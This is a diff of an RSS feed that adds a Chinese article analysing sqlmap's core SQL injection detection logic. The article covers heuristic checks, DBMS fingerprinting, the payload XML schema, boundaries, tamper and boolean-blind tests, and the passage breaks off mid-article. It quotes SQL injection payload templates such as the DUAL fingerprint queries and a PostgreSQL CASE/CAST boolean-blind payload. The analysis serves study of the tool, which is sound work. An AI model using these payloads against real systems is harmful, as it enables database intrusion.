@@ -5,7 +5,258 @@
 <link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
 <description></description>
 <language>zh-cn</language>
-<lastBuildDate>Wed, 12 Sep 2018 03:14:15 +0800</lastBuildDate>
+<lastBuildDate>Sat, 29 Sep 2018 22:05:03 +0800</lastBuildDate>
+<item>
+<title>sqlmap 内核分析 III: 核心逻辑</title>
+<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-09-25-45291193.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/45291193&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ab4b5d32ff7b3377b7dbe60c6c96676a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a href=&quot;https://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt;&lt;/p&gt;&lt;p&gt;安全研发工程师，现就职于长亭科技，喜欢喵喵&lt;/p&gt;&lt;p&gt;本文的内容可能是大家最期待的部分，但是可能并不推荐大家直接阅读本篇文章，因为太多原理性和整体逻辑上的东西散见前两篇文章，直接阅读本文可能会有一些难以预料的困难。：）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 前言&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上一篇文章，我们介绍了页面相似度算法以及 sqlmap 对于页面相似的判定规则，同样也跟入了 sqlmap 的一些预处理核心函数。在接下来的部分中，我们会直接开始 sqlmap 的核心检测逻辑的分析，主要涉及到以下方面：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; 启发式 SQL 注入检测（包括简单的 XSS FI 判断）&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; SQL 注入检测&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;0x01 heuristicCheckSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数位于 &lt;code class=&quot;inline&quot;&gt;controller.py&lt;/code&gt; 的 &lt;code class=&quot;inline&quot;&gt;start()&lt;/code&gt; 函数中，同时我们在整体逻辑中也明确指明了这一个步骤：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-09948b0ca58809429e56dd2310d5ec2f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;611&quot; data-rawheight=&quot;446&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-09948b0ca58809429e56dd2310d5ec2f&quot; data-watermark-src=&quot;v2-f7f32b45d24eb8d0e6f2e09462767fd1&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这标红的两个步骤其实就是本篇文章主要需要分析的两个部分，涉及到 sqlmap 检测 sql 注入漏洞的核心逻辑。其中 &lt;code class=&quot;inline&quot;&gt;heuristicCheckSqlInjection&lt;/code&gt; 是我们本节需要分析的问题。这个函数的执行位置如下：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c98c16df1617579e51f1f913f6fb3133_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1230&quot; data-rawheight=&quot;665&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-c98c16df1617579e51f1f913f6fb3133&quot; data-watermark-src=&quot;v2-1e909895c30fa2ec191a9ea45e811a07&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;再上图代码中，2标号为其位置。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;启发式 sql 注入检测整体逻辑&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;通过分析其源代码，笔者先行整理出他的逻辑：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7da991a0edce2a8f194655c662947172_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1276&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-7da991a0edce2a8f194655c662947172&quot; data-watermark-src=&quot;v2-ca8b016586a9ac0cb1dd4a3db315e29c&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据我们整理出的启发式检测流程图，我们做如下补充说明。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;进行启发式 sql 注入检测的前提条件是没有开启   &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 并且页面并不是 &lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt;。关于这两个属性，我们在第二篇文章中都有相关介绍，对于 &lt;code class=&quot;inline&quot;&gt;nullConnection&lt;/code&gt; 指的是一种不需要知道他的具体内容就可以知道整个内容大小的请求方法；&lt;code class=&quot;inline&quot;&gt;heavilyDynamic&lt;/code&gt; 指的是，在不改变任何参数的情况下，请求两次页面，两次页面的相似度低于 0.98。&lt;/li&gt;&lt;li&gt;在实际的代码中，决定注入的结果报告的，主要在于两个标识位，分别为：&lt;code class=&quot;inline&quot;&gt;casting&lt;/code&gt; 与 &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt;。笔者在下方做代码批注和说明：&lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-65ac833460ef8e12ff6daaabc9877f78_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2280&quot; data-rawheight=&quot;716&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-65ac833460ef8e12ff6daaabc9877f78&quot; data-watermark-src=&quot;v2-e4cb4750c314ba6f8aae4f8641ca9f82&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;3.&lt;code class=&quot;inline&quot;&gt; casting&lt;/code&gt; 这个标识位主要取决于两种情况：第一种在第一个请求就发现存在了特定的类型检查的迹象；第二种是在请求小数情况的时候，发现小数被强行转换为整数。通常对于这种问题，在不考虑 tamper 的情况下，一般很难检测出或者绕过。&lt;/p&gt;&lt;p&gt;4. &lt;code class=&quot;inline&quot;&gt;result&lt;/code&gt; 这个标识位取决于：如果检测出 DBMS 错误，则会设置这个标识位为 True；如果出现了数据库执行数值运算，也置为 True。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;XSS 与 FI&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;实际上在启发式 sql 注入检测完毕之后，会执行其他的检测：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e8d011c2b1307283c0d6b53e47775df8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1644&quot; data-rawheight=&quot;870&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-e8d011c2b1307283c0d6b53e47775df8&quot; data-watermark-src=&quot;v2-53ef9a98611b8aa91bb8e7ff7ee54e1f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;ol&gt;&lt;li&gt;检测 XSS 的方法其实就是检查 &lt;code class=&quot;inline&quot;&gt;&quot;&amp;lt;&#39;\&quot;&amp;gt;&quot;&lt;/code&gt;，是否出现在了结果中。作为扩展，我们可以在此检查是否随机字符串还在页面中，从而判断是否存在 XSS 的迹象。&lt;/li&gt;&lt;li&gt;检测 FI（文件包含），就是检测结果中是否包含了 &lt;code class=&quot;inline&quot;&gt;include/require&lt;/code&gt; 等报错信息，这些信息是通过特定正则表达式来匹配检测的。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;0x02 checkSqlInjection&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这个函数可以说是 sqlmap 中最核心的函数了。在这个函数中，处理了 Payload 的各种细节和测试用例的各种细节。&lt;/p&gt;&lt;p&gt;大致执行步骤分为如下几个大部分：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;根据已知参数类型筛选 boundary&lt;/li&gt;&lt;li&gt;启发式检测数据库类型 &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt;&lt;/li&gt;&lt;li&gt;payload 预处理（UNION）&lt;/li&gt;&lt;li&gt;过滤与排除不合适的测试用例&lt;/li&gt;&lt;li&gt;对筛选出的边界进行遍历与 payload 整合&lt;/li&gt;&lt;li&gt;payload 渲染&lt;/li&gt;&lt;li&gt;针对四种类型的注入分别进行 response 的响应和处理&lt;/li&gt;&lt;li&gt;得出结果，返回结果&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;下图是笔者折叠无关代码之后剩余的最核心的循环和条件分支，我们发现他关于 &lt;code class=&quot;inline&quot;&gt;injectable&lt;/code&gt; 的设置完全是通过 &lt;code class=&quot;inline&quot;&gt;if method == PAYLOAD.METHOD.[COMPARISON/GREP/TIME/UNION]&lt;/code&gt; 这几个条件分支去处理的，同时这些条件显然是 sqlmap 针对不同的注入类型的 Payload 进行自己的结果处理逻辑饿和判断逻辑。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-1ff54b5a86ad202b1b2b0d770c262eb7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1774&quot; data-rawheight=&quot;1312&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-1ff54b5a86ad202b1b2b0d770c262eb7&quot; data-watermark-src=&quot;v2-8fb80e21a653bfa7afbdc16fa7221498&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;数据库类型检测 heuristicCheckDbms&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在本大节刚开始的时候，就已经说明了第二步是确定数据库的类型，那么数据库类型来源于用户设定或者自动检测，当截止第二步之前还没有办法确定数据库类型的时候，就会自动启动 &lt;code class=&quot;inline&quot;&gt;heuristicCheckDbms&lt;/code&gt; 这个函数，利用一些简单的测试来确定数据库类型。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b1c6a11d5b3a8a023cf5a4444675e1d9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1229&quot; data-rawheight=&quot;652&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-b1c6a11d5b3a8a023cf5a4444675e1d9&quot; data-watermark-src=&quot;v2-5c4556182c1195c912df953e4c08951f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;其实这个步骤非常简单，核心原理是利用简单的布尔盲注构造一个 &lt;code class=&quot;inline&quot;&gt;(SELECT &quot;[RANDSTR]&quot; [FROM_DUMMY_TABLE.get(dbms)] )=&quot;[RANDSTR1]&quot;&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;(SELECT &#39;[RANDSTR]&#39; [FROM_DUMMY_TABLE.get(dbms)] )=&#39;[RANDSTR1]&#39;&lt;/code&gt; 这两个 Payload 的请求判断。其中&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;FROM_DUMMY_TABLE = {
+    DBMS.ORACLE: &quot; FROM DUAL&quot;,
+    DBMS.ACCESS: &quot; FROM MSysAccessObjects&quot;,
+    DBMS.FIREBIRD: &quot; FROM RDB$DATABASE&quot;,
+    DBMS.MAXDB: &quot; FROM VERSIONS&quot;,
+    DBMS.DB2: &quot; FROM SYSIBM.SYSDUMMY1&quot;,
+    DBMS.HSQLDB: &quot; FROM INFORMATION_SCHEMA.SYSTEM_USERS&quot;,
+    DBMS.INFORMIX: &quot; FROM SYSMASTER:SYSDUAL&quot;
+}&lt;/code&gt;&lt;p&gt;例如，检查是否是 ORACLE 的时候，就会生成 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
+(SELECT &#39;abc&#39; FROM DUAL)=&#39;abc&#39; 
+(SELECT &#39;abc&#39; FROM DUAL)=&#39;abcd&#39;&lt;/code&gt;&lt;p&gt;这样的两个 Payload，如果确实存在正负关系（具体内容参见后续章节的布尔盲注检测），则表明数据库就是 ORACLE。&lt;/p&gt;&lt;p&gt;当然数据库类型检测并不是必须的，因为 sqlmap 实际工作中，如果没有指定 DBMS 则会按照当前测试 Payload 的对应的数据库类型去设置。&lt;/p&gt;&lt;p&gt;实际上在各种 Payload 的执行过程中，会包含着一些数据库的推断信息(&lt;code class=&quot;inline&quot;&gt;&amp;lt;details&amp;gt;&lt;/code&gt;)，如果 Payload 成功执行，这些信息可以被顺利推断则数据库类型就可以推断出来。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;测试数据模型与 Payload 介绍&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在实际的代码中，&lt;code class=&quot;inline&quot;&gt;checkSqlInjection&lt;/code&gt; 是一个接近七百行的函数。当然其行为也并不是仅仅通过我们上面列出的步骤就可以完全概括的，其中涉及到了很多关于 Payload 定义中字段的操作。显然，直到现在我们都并不是特别了解一个 Payload 中存在着什么样的定义，当然也不会懂得这些操作对于这些字段到底有什么具体的意义。所以我们没有办法在不了解真正 Payload 的时候开始之后的步骤。&lt;/p&gt;&lt;p&gt;因此在本节中，我们会详细介绍关于具体测试 Payload 的数据模型，并且基于这些模型和源码分析 sqlmap 实际的行为，和 sql 注入原理的细节知识。   ·&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&amp;lt;test&amp;gt; 通用模型&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;关于通用模型其实在 sqlmap 中有非常详细的说明，位置在 &lt;code class=&quot;inline&quot;&gt;xml/payloads/boolean_blind.xml&lt;/code&gt; 中，我们把他们分隔开分别来讲解具体字段对应的代码的行为。&lt;/p&gt;&lt;p&gt;首先我们必须明白一个具体的 testcase 对应一个具体的 xml 元素是什么样子：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
+&amp;lt;test&amp;gt;
+    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
+    &amp;lt;stype&amp;gt;&amp;lt;/stype&amp;gt;
+    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt;
+    &amp;lt;risk&amp;gt;&amp;lt;/risk&amp;gt;
+    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
+    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
+    &amp;lt;vector&amp;gt;&amp;lt;/vector&amp;gt;
+    &amp;lt;request&amp;gt;
+        &amp;lt;payload&amp;gt;&amp;lt;/payload&amp;gt;
+        &amp;lt;comment&amp;gt;&amp;lt;/comment&amp;gt;
+        &amp;lt;char&amp;gt;&amp;lt;/char&amp;gt;
+        &amp;lt;columns&amp;gt;&amp;lt;/columns&amp;gt;
+    &amp;lt;/request&amp;gt;
+    &amp;lt;response&amp;gt;
+        &amp;lt;comparison&amp;gt;&amp;lt;/comparison&amp;gt;
+        &amp;lt;grep&amp;gt;&amp;lt;/grep&amp;gt;
+        &amp;lt;time&amp;gt;&amp;lt;/time&amp;gt;
+        &amp;lt;union&amp;gt;&amp;lt;/union&amp;gt;
+    &amp;lt;/response&amp;gt;
+    &amp;lt;details&amp;gt;
+        &amp;lt;dbms&amp;gt;&amp;lt;/dbms&amp;gt;
+        &amp;lt;dbms_version&amp;gt;&amp;lt;/dbms_version&amp;gt;
+        &amp;lt;os&amp;gt;&amp;lt;/os&amp;gt;
+    &amp;lt;/details&amp;gt;
+&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;关于上面的一个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 标签内的元素都是实际上包含的不只是一个 Payload 还包含&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
+Sub-tag: &amp;lt;title&amp;gt;
+    Title of the test. 测试的名称，这些名称就是我们实际在测试的时候输出的日志中的内容&lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-11a7571b205d2558989f6054596e05cb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;768&quot; data-rawheight=&quot;285&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-11a7571b205d2558989f6054596e05cb&quot; data-watermark-src=&quot;v2-e0b5748a512d87cfb212898eb0a3b017&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;上图表示一个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 中的 title 会被输出作为调试信息。&lt;/p&gt;&lt;p&gt;除非必要的子标签，笔者将会直接把标注写在下面的代码块中，&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Sub-tag: &amp;lt;stype&amp;gt;
+    SQL injection family type. 表示注入的类型。
+​
+    Valid values:
+        1: Boolean-based blind SQL injection
+        2: Error-based queries SQL injection
+        3: Inline queries SQL injection
+        4: Stacked queries SQL injection
+        5: Time-based blind SQL injection
+        6: UNION query SQL injection
+​
+Sub-tag: &amp;lt;level&amp;gt;
+    From which level check for this test. 测试的级别
+​
+    Valid values:
+        1: Always (&amp;lt;100 requests)
+        2: Try a bit harder (100-200 requests)
+        3: Good number of requests (200-500 requests)
+        4: Extensive test (500-1000 requests)
+        5: You have plenty of time (&amp;gt;1000 requests)
+​
+Sub-tag: &amp;lt;risk&amp;gt;
+    Likelihood of a payload to damage the data integrity.这个选项表明对目标数据库的损坏程度，risk 最高三级，最高等级代表对数据库可能会有危险的•操作，比如修改一些数据，插入一些数据甚至删除一些数据。
+​
+    Valid values:
+        1: Low risk
+        2: Medium risk
+        3: High risk
+​
+Sub-tag: &amp;lt;clause&amp;gt;
+    In which clause the payload can work. 这个字段表明 &amp;lt;test&amp;gt; 对应的测试 Payload 适用于哪种类型的 SQL 语句。一般来说，很多语句并不一定非要特定 WHERE 位置的。
+​
+    NOTE: for instance, there are some payload that do not have to be
+    tested as soon as it has been identified whether or not the
+    injection is within a WHERE clause condition.
+​
+    Valid values:
+        0: Always
+        1: WHERE / HAVING
+        2: GROUP BY
+        3: ORDER BY
+        4: LIMIT
+        5: OFFSET
+        6: TOP
+        7: Table name
+        8: Column name
+        9: Pre-WHERE (non-query)
+​
+    A comma separated list of these values is also possible.&lt;/code&gt;&lt;p&gt;在上面几个子标签中，我们经常见的就是 &lt;code class=&quot;inline&quot;&gt;level/risk&lt;/code&gt; 一般来说，默认的 sqlmap 配置跑不出漏洞的时候，我们通常会启动更高级别 &lt;code class=&quot;inline&quot;&gt;(level=5/risk=3)&lt;/code&gt; 的配置项来启动更多的 payload。&lt;/p&gt;&lt;p&gt;接下来我们再分析下面的标签&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
+Sub-tag: &amp;lt;where&amp;gt;
+    Where to add our &#39;&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&#39; string.
+​
+    Valid values:
+        1: Append the string to the parameter original value
+        2: Replace the parameter original value with a negative random
+            integer value and append our string
+        3: Replace the parameter original value with our string
+​
+Sub-tag: &amp;lt;vector&amp;gt;
+    The payload that will be used to exploit the injection point.
+    这个标签只是大致说明 Payload 长什么样子，其实实际请求的 Payload 或者变形之前的 Payload 可能并不是这个 Payload，以 request 子标签中的 payload 为准。
+​
+Sub-tag: &amp;lt;request&amp;gt; 
+    What to inject for this test.
+    关于发起请求的设置与配置。在这些配置中，有一些是特有的，但是有一些是必须的，例如 payload 是肯定存在的，但是 comment 是不一定有的，char 和 columns 是只有 UNION 才存在
+​
+    Sub-tag: &amp;lt;payload&amp;gt;
+        The payload to test for. 实际测试使用的 Payload
+​
+    Sub-tag: &amp;lt;comment&amp;gt;
+        Comment to append to the payload, before the suffix.
+​
+    Sub-tag: &amp;lt;char&amp;gt; 只有 UNION 注入存在的字段
+        Character to use to bruteforce number of columns in UNION
+        query SQL injection tests.
+​
+    Sub-tag: &amp;lt;columns&amp;gt; 只有 UNION 注入存在的字段
+        Range of columns to test for in UNION query SQL injection
+        tests.
+​
+Sub-tag: &amp;lt;response&amp;gt;
+    How to identify if the injected payload succeeded.
+    由于 payload 的目的不一定是相同的，所以，实际上处理请求的方法也并不是相同的，具体的处理方法步骤，在我们后续的章节中有详细的分析。
+​
+    Sub-tag: &amp;lt;comparison&amp;gt; 
+        针对布尔盲注的特有字段，表示对比和 request 中请求的结果。
+        Perform a request with this string as the payload and compare
+        the response with the &amp;lt;payload&amp;gt; response. Apply the comparison
+        algorithm.
+​
+        NOTE: useful to test for boolean-based blind SQL injections.
+​
+    Sub-tag: &amp;lt;grep&amp;gt; 
+        针对报错型注入的特有字段，使用正则表达式去匹配结果。
+        Regular expression to grep for in the response body.
+​
+        NOTE: useful to test for error-based SQL injection.
+​
+    Sub-tag: &amp;lt;time&amp;gt;
+        针对时间盲注
+        Time in seconds to wait before the response is returned.
+​
+        NOTE: useful to test for time-based blind and stacked queries
+        SQL injections.
+​
+    Sub-tag: &amp;lt;union&amp;gt;
+        处理 UNION •注入的办法。
+        Calls unionTest() function.
+​
+        NOTE: useful to test for UNION query (inband) SQL injection.
+​
+Sub-tag: &amp;lt;details&amp;gt;
+    Which details can be infered if the payload succeed.
+    如果 response 标签中的检测结果成功了，可以推断出什么结论？
+​
+    Sub-tags: &amp;lt;dbms&amp;gt;
+        What is the database management system (e.g. MySQL).
+​
+    Sub-tags: &amp;lt;dbms_version&amp;gt;
+        What is the database management system version (e.g. 5.0.51).
+​
+    Sub-tags: &amp;lt;os&amp;gt;
+        What is the database management system underlying operating
+        system.&lt;/code&gt;&lt;p&gt;在初步了解了基本的 Payload 测试数据模型之后，我们接下来进行详细的检测逻辑的细节分析，因为篇幅的原因，我们暂且只针对布尔盲注和时间盲注进行分析，&lt;/p&gt;&lt;h2&gt;&lt;b&gt;真正的 Payload&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们在前面的介绍中发现了几个疑似 Payload 的字段，但是遗憾的是，上面的每一个 Payload 都不是真正的 Payload。实际 sqlmap 在处理的过程中，只要是从 &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; 中加载的 Payload，都是需要经过一些随机化和预处理，这些预处理涉及到的概念如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;：需要为原始 Payload 的前后添加“边界”。边界是一个神奇的东西，主要取决于当前“拼接”的 SQL 语句的上下文，常见上下文：注入位置是一个“整形”；注入位置需要单引号/双引号&lt;code class=&quot;inline&quot;&gt;(&#39;/&quot;)&lt;/code&gt;闭合边界；注入位置在一个括号语句中。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;--tamper&lt;/code&gt;：Tamper 是 sqlmap 中最重要的概念之一，也是 Bypass 各种防火墙的有力的武器。在 sqlmap 中，Tamper 的处理位于我们上一篇文章中的 &lt;code class=&quot;inline&quot;&gt;agent.queryPage()&lt;/code&gt; 中，具体位于其对 Payload 的处理。&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;&quot;Render&quot;&lt;/code&gt;：当然这一个步骤在 sqlmap 中没有明显的概念进行对应，其主要是针对 Payload 中随机化的标签进行渲染和替换，例如：&lt;br&gt;&lt;br&gt;[INFERENCE] 这个标签通常被替换成一个等式，这个等式用于判断结果的正负`Positive/Negative`&lt;br&gt;[RANDSTR] 会被替换成随机字符串&lt;br&gt;[RANDNUM] 与 [RANDNUMn] •会被替换成不同的数字&lt;br&gt;[SLEEPTIME] 在时间盲注中会被替换为 SLEEP 的时间&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;所以，实际上从 &lt;code class=&quot;inline&quot;&gt;*.xml&lt;/code&gt; 中加载出来的 Payload 需要经过上面的处理才能真的算是处理完成。这个 Payload 才会在 &lt;code class=&quot;inline&quot;&gt;agent.queryPage&lt;/code&gt; 的日志中输出出来，也就是我们 &lt;code class=&quot;inline&quot;&gt;sqlmap -v3&lt;/code&gt; 选项看到的最终 Payload。&lt;/p&gt;&lt;p&gt;在上面的介绍中，我们又提到了一个陌生的概念，&lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;，并且做了相对简单的介绍，具体的 &lt;code class=&quot;inline&quot;&gt;Boundary&lt;/code&gt;，我们在 &lt;code class=&quot;inline&quot;&gt;{sqlmap_dir}/xml/boundaries.xml&lt;/code&gt; 中可以找到：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
+&amp;lt;boundary&amp;gt;
+    &amp;lt;level&amp;gt;&amp;lt;/level&amp;gt; 
+    &amp;lt;clause&amp;gt;&amp;lt;/clause&amp;gt;
+    &amp;lt;where&amp;gt;&amp;lt;/where&amp;gt;
+    &amp;lt;ptype&amp;gt;&amp;lt;/ptype&amp;gt;
+    &amp;lt;prefix&amp;gt;&amp;lt;/prefix&amp;gt;
+    &amp;lt;suffix&amp;gt;&amp;lt;/suffix&amp;gt;
+&amp;lt;/boundary&amp;gt;&lt;/code&gt;&lt;p&gt;在具体的定义中，我们发现没见过的子标签如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
+    Sub-tag: &amp;lt;ptype&amp;gt;
+        What is the parameter value type. 参数•类型（参数边界上下文类型）
+​
+        Valid values:
+            1: Unescaped numeric
+            2: Single quoted string
+            3: LIKE single quoted string
+            4: Double quoted string
+            5: LIKE double quoted string
+​
+    Sub-tag: &amp;lt;prefix&amp;gt;
+        A string to prepend to the payload.
+​
+    Sub-tag: &amp;lt;suffix&amp;gt;
+        A string to append to the payload.&lt;/code&gt;&lt;p&gt;其实到现在 sqlmap 中 Payload 的结构我们就非常清楚了&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;
+&amp;lt;prefix&amp;gt; &amp;lt;payload&amp;gt;&amp;lt;comment&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt;&lt;p&gt;其中 &lt;code class=&quot;inline&quot;&gt;&amp;lt;prefix&amp;gt; &amp;lt;suffix&amp;gt;&lt;/code&gt; 来源于 &lt;code class=&quot;inline&quot;&gt;boundaries.xml&lt;/code&gt; 中，而 &lt;code class=&quot;inline&quot;&gt;&amp;lt;payload&amp;gt; &amp;lt;comment&amp;gt;&lt;/code&gt; 来源于本身 &lt;code class=&quot;inline&quot;&gt;xml/payloads/*.xml&lt;/code&gt; 中的 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 中。在本节中都有非常详细的描述了&lt;/p&gt;&lt;h2&gt;&lt;b&gt;针对布尔盲注的检测&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在接下来的小节中，我们将会针对几种注入进行详细分析，我们的分析依据主要是 sqlmap 设定的 Payload 的数据模型和其本身的代码。本节先针对布尔盲注进行一些详细分析。&lt;/p&gt;&lt;p&gt;在分析之前，我们先看一个详细的 Payload:&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;
+&amp;lt;test&amp;gt;
+    &amp;lt;title&amp;gt;PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)&amp;lt;/title&amp;gt;
+    &amp;lt;stype&amp;gt;1&amp;lt;/stype&amp;gt;
+    &amp;lt;level&amp;gt;3&amp;lt;/level&amp;gt;
+    &amp;lt;risk&amp;gt;3&amp;lt;/risk&amp;gt;
+    &amp;lt;clause&amp;gt;1&amp;lt;/clause&amp;gt;
+    &amp;lt;where&amp;gt;2&amp;lt;/where&amp;gt;
+    &amp;lt;vector&amp;gt;OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/vector&amp;gt;
+    &amp;lt;request&amp;gt;
+        &amp;lt;payload&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/payload&amp;gt;
+    &amp;lt;/request&amp;gt;
+    &amp;lt;response&amp;gt;
+        &amp;lt;comparison&amp;gt;OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST(&#39;[RANDSTR]&#39; AS NUMERIC) END)) IS NULL&amp;lt;/comparison&amp;gt;
+    &amp;lt;/response&amp;gt;
+    &amp;lt;details&amp;gt;
+        &amp;lt;dbms&amp;gt;PostgreSQL&amp;lt;/dbms&amp;gt;
+    &amp;lt;/details&amp;gt;
+&amp;lt;/test&amp;gt;&lt;/code&gt;&lt;p&gt;根据上一节介绍的子标签的特性，我们可以大致观察这个 &lt;code class=&quot;inline&quot;&gt;&amp;lt;test&amp;gt;&lt;/code&gt; 会至少发送两个 Payload：第一个为 &lt;code class=&quot;inline&quot;&gt;request&lt;/code&gt; 标签中的 &lt;code class=&quot;inline&quot;&gt;payload&lt;/code&gt; 第二个为 &lt;code class=&quot;inline&quot;&gt;response&lt;/code&gt; 标签中的 &lt;code class=&quot;inline&quot;&gt;comparison&lt;/code&gt; 中的 Payload。&lt;/p&gt;&lt;p&gt;当然我们很容易想到，针对布尔盲注的检测实际上只需要检测 &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; 和 &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; 这两个请求，只要这两个请求页面不相同，就可以判定是存在问题的。可是事实真的如此吗？结果当然并没有这么简单。&lt;/p&gt;&lt;p&gt;我们首先定义 &lt;code class=&quot;inline&quot;&gt;request.payload&lt;/code&gt; 中的的请求为正请求 &lt;code class=&quot;inline&quot;&gt;Positive&lt;/code&gt;，对应 &lt;code class=&quot;inline&quot;&gt;response.comparison&lt;/code&gt; 中的请求为负请求 &lt;code class=&quot;inline&quot;&gt;Negative&lt;/code&gt;，在 sqlmap 中原处理如下：&lt;/p&gt;&lt;img 